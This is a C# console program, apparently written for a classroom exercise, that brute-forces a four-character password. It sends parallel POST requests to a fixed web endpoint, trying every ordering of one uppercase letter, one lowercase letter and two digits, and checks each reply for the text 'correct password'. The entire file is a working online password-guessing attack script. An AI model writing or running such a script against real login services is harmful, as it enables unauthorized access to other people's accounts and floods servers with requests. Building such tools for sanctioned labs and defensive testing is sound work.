using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

class Program
{
    static async Task Main(string[] args)
    {
        var httpClient = new HttpClient();
        string url = "https://fiapnet.azurewebsites.net/fiap";
        string group = "12";  // Replace with your group

        char[] uppercaseLetters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray();
        char[] lowercaseLetters = "abcdefghijklmnopqrstuvwxyz".ToCharArray();
        char[] numbers = "0123456789".ToCharArray();

        // Parallel.For to try different password combinations in parallel
        Parallel.For(0, uppercaseLetters.Length, (i, state) =>
        {
            for (int j = 0; j < lowercaseLetters.Length; j++)
            {
                for (int k = 0; k < numbers.Length; k++)
                {
                    for (int l = 0; l < numbers.Length; l++)
                    {
                        // Generate a combination of characters
                        char[] passwordArray = { uppercaseLetters[i], lowercaseLetters[j], numbers[k], numbers[l] };

                        // Generate all possible permutations of this combination
                        var permutations = GetPermutations(passwordArray);

                        foreach (var password in permutations)
                        {
                            var response = TryPassword(httpClient, url, group, password).Result;

                            if (response)
                            {
                                Console.WriteLine($"Password found: {password} - Success");
                                state.Stop();  // Stop all threads
                                return;
                            }
                            else
                            {
                                Console.WriteLine($"Password: {password} - Failed");
                            }
                        }
                    }
                }
            }
        });

        httpClient.Dispose();
        Console.WriteLine("Process finished.");
    }

    // Generate all permutations of a character array
    static IEnumerable<string> GetPermutations(char[] array)
    {
        var results = new List<string>();
        Permute(array, 0, array.Length - 1, results);
        return results;
    }

    // Helper function to generate permutations
    static void Permute(char[] array, int l, int r, List<string> results)
    {
        if (l == r)
        {
            results.Add(new string(array));
        }
        else
        {
            for (int i = l; i <= r; i++)
            {
                Swap(ref array[l], ref array[i]);
                Permute(array, l + 1, r, results);
                Swap(ref array[l], ref array[i]); // backtrack
            }
        }
    }

    static void Swap(ref char a, ref char b)
    {
        char temp = a;
        a = b;
        b = temp;
    }

    static async Task<bool> TryPassword(HttpClient httpClient, string url, string group, string password)
    {
        var data = new { Key = password, group = group };
        var jsonContent = new StringContent(JsonSerializer.Serialize(data), Encoding.UTF8, "application/json");

        try
        {
            var response = await httpClient.PostAsync(url, jsonContent);
            if (response.IsSuccessStatusCode)
            {
                // Here you can check if the password was correct, depending on the expected response
                string responseBody = await response.Content.ReadAsStringAsync();
                return responseBody.Contains("correct password");  // Adjust according to the correct response
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error trying password {password}: {ex.Message}");
        }

        return false;
    }
}
